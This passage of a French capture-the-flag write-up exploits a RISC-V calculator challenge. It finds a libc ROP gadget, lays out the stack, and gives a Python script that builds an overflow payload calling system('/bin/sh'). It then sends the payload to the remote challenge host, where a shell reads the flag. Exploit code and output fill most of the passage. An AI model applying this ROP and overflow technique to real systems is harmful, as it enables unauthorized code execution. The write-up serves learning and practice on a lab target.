──────────────────────────────────[ DISASM / rv64 / set emulate on ]───────────────────────────────────
Invalid address 0x4141414141414140
```

On a bien réussi à avoir une segmentation fault, on peut maintenant commencer à chercher des gadgets pour faire un appel à `system("/bin/sh")`. Pour faire un appel à une fonction, l'ABI RISC-V spécifie que le premier paramètre doit être passé dans le registre A0. Idéalement il nous faudrait trouver un gadget qui charge RA depuis la stack `ld ra, n(sp)`, load A0 depuis la stack `ld a0, n(sp)`et finisse par un `ret`. Bien que ROPGadget fonctionne avec les binaires RISC-V j'ai préféré chercher les gadgets manuellement avec `riscv64-unknown-linux-gnu-objdump` dans la libc étant donné que l'ASLR est désactivé. Pour cela j'ai fait un grep un peu crade:


```text
riscv64-unknown-linux-gnu-objdump -axd /home/challenger/riscv/sysroot/lib/libc.so.6 | grep -P "ld\s+ra" -A5 -B5 | grep -P "ld\s+a0" -A5 -B5

[...]

3ba86:       60e2                    ld      ra,24(sp)
   3ba88:       6522                    ld      a0,8(sp)
   3ba8a:       6105                    add     sp,sp,32
   3ba8c:       8082                    ret

[...]
```

Parfait! On récupère l'adresse de `system` et d'une chaine de caractère "/bin/sh" dans la libc grâce à gdb et on va pouvoir finaliser notre exploit. Voilà à quoi devrait ressembler la stack pour que l'exploit fonctionne:

```goat
                    +------------------+
Node n°22   SP + 24 |   0x4000869688   | ---> <system>
                    +------------------+
Node n°21   SP + 16 |0x4242424242424242| ---> dummy à 16(sp)
                    +------------------+
Node n°20   SP + 8  |   0x400092c6c8   | ---> "/bin/sh"
                    +------------------+
Node n°19       SP  |0x4141414141414141| ---> dummy à 0(sp)
                    +------------------+
Node n°18   SP - 8  |   0x400085fa86   | -----.
                    +------------------+       |          +--------------+
                                                '------>  | ld ra,24(sp) |            +-------------------+
                                                          | ld  a0,8(sp) |       .--> | system("/bin/sh") |
                                                          | add sp,sp,32 |      |     +-------------------+
                                                          | ret          | ----'
                                                          +--------------+
```

Etant donné que le fonctionnement du programme implique que chaque node représente le calcul d'au moins une de ses filles avec une autre expression (une autre node ou une constante), pour que la node 19 vaille bien `0x4141414141414141`, il faut que son expression associée soit: `<Node_18> + (0x4141414141414141 - 0x400085fa86)`, et il nous faut répéter cette logique pour toutes les nodes qui composeront notre ROP-chain, voilà un extrait de l'AST correspondant à la ROP-chain:


```goat
           .--.
          | 21 |
           '--'
          /    \
         /      \
        /        \
       /          \
    .-.            .--.
   | 0 |          | 20 | <--- Node additive qui va faire <dummy> ＋ (−<dummy> + <binsh_addr>) = <binsh_addr>
    '-'            '--'
   /   \          /    \
  /     \        /      \
 /       \      /        \
1         1    /          (-<dummy> ＋ <binsh_addr>)
           .--.            
          | 19 | <--- Node soustractive qui va faire <gadget_addr> - (<gadget_addr> - <dummy>) = <dummy>
           '--' 
          /    \
         /      \
        /        \
       /          (<gadget_addr> - <dummy>)
      .--. 
     | 18 | <--- Node additive qui va faire 0 ＋ <gadget_addr> = <gadget_addr>
      '--' 
     /    \
    ·      \
   ·        \
  ·

```

Voilà le script que j'ai fait pour automatiser la tâche d'écrire le payload:

```python
"""
   3ba86:       60e2                    ld      ra,24(sp)
   3ba88:       6522                    ld      a0,8(sp)
   3ba8a:       6105                    add     sp,sp,32
   3ba8c:       8082                    ret
"""

libc_base = 0x4000824000
system_address = 0x4000869688
binsh_address = 0x400092c6c8

first_gadget = libc_base + 0x3ba86
second_gadget = 0x41414141
third_gadget = 0x42424242

# First stage : Creating the 0th operations to trigger overflow

first_stage = "(1*1)"

# Second stage : Generating 17 dummy operations

# Replacing some of "0(0)" expressions by "-0" because it takes less characters and inputs is limited at 128 chars.
second_stage = "-----0"

for i in range(17 - 5):
    second_stage = f"0({second_stage})"

    
# Third stage : Adding gadgets

third_stage = f"{first_stage}({second_stage}+{str(first_gadget)}-{str(first_gadget-second_gadget)}+{str(binsh_address-second_gadget)}-{str(binsh_address-third_gadget)}+{str(system_address-third_gadget)})"

# Last stage : Adding Integer overflow with handle_power function : 

fourth_stage = f"({third_stage})**8188"

payload = fourth_stage
print(payload)

# ((1*1)(0(0(0(0(0(0(0(0(0(0(0(0(-----0))))))))))))+274886687366-273791891781+273792730503-273775887494+273775088710))**8188
```

Etant donné que le `sysroot` fourni avec le challenge ne comportait pas de binaire `sh`, on ne peut pas tester notre exploit en local on va donc la lancer directement en remote et comme l'input est alphanumérique uniquement on a même pas besoin de pwntools 😉:

```c
nc instances.challenge-ecw.fr 42556
>> ((1*1)(0(0(0(0(0(0(0(0(0(0(0(0(-----0))))))))))))+274886687366-273791891781+273792730503-273775887494+273775088710))**8188

id
uid=1000 gid=1000 groups=1000
ls
calculator-shadow
flag.txt
qemu-riscv64-shadow
run
sysroot
cat flag.txt
ECW{1n57ruc710n_5375_w4n7_70_b3_fr33}
```

## Conclusion

J'ai beaucoup aimé ce challenge parce qu'il était très original et vraiment réaliste tout en me permettant d'en apprendre plus sur l'API frontend des tcg QEMU!